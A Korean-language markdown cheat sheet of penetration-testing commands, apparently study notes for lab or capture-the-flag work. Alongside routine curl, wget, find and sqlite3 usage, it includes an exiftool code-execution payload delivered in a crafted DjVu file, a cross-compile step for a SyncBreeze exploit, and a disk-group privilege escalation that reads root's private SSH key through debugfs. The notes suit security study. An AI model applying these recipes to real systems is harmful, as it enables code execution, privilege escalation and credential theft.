# exiftool

```bash
exiftool -a -u brochure.pdf
```

- `exiftool` : 이미지/문서/영상 파일의 메타데이터를 조회·수정하는 도구  
- `-a` (*allow duplicates*) : 중복 키가 있어도 모두 표시  
- `-u` (*unknown*) : 표준에 없는(알 수 없는) 태그까지 표시  
- `brochure.pdf` : 대상 파일

## exiftool code execution
```bash
payload : (metadata "\c${system('id')};")
bzz payload payload.bzz
djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
file exploit.djvu
```
---

# 교차 컴파일

```bash
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```

---
# curl
```bash
curl -L http://192.168.132.65
```

- `-L` : redirection

---
# wget
```bash
wget http://ip/test.txt -O /tmp/test.txt
```

- `-O` : 데이터 저장(대문자)

---
# find
```bash
find . -name '*config*' 2>/dev/null
```
---

# sqlite3
```bash
sqlite3 {dbname}
.tables
.headers on   # 컬럼 이름 출력
.mode column  # 표 형식으로 출력
select * from user;
.quit
```
---
# disk group privilege escalation
- https://www.hackingarticles.in/disk-group-privilege-escalation/
- `disk` 그룹은 **로우 블록 디바이스**(예: `/dev/sda`, `/dev/nvme0n1p2`)에 접근할 수 있습니다.  
```bash
df -h  # 현재 마운트된 파일시스템의 디스크 사용량을 사람이 읽기 쉬운 형태로 출력합니다.
```
<img width="689" height="248" alt="image" src="https://github.com/user-attachments/assets/96e0cff6-b9f2-4624-9c36-417a71ddac0c" />

```bash
debugfs /dev/sda3  # 파일시스템의 내부 구조를 조작하거나 디버깅할 수 있는 저수준 파일시스템 디버거 실행
mkdir test         # readonly로 설정되어 있으면 아래 코드 실행
cat /root/.ssh/id_rsa
```
